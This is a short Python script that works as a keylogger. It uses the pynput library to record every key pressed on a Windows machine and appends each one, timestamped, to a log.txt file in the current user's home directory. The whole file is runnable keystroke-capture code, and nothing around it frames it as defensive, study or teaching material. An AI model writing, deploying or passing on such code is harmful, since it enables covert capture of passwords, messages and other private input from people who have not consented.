from pynput.keyboard import Listener

import os
import logging


username = os.getlogin()
loggin_directory = f"C:/Users/{username}"

logging.basicConfig(filename=f"{loggin_directory}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(str(key))

with Listener(on_press=key_handler) as listener:
    listener.join()
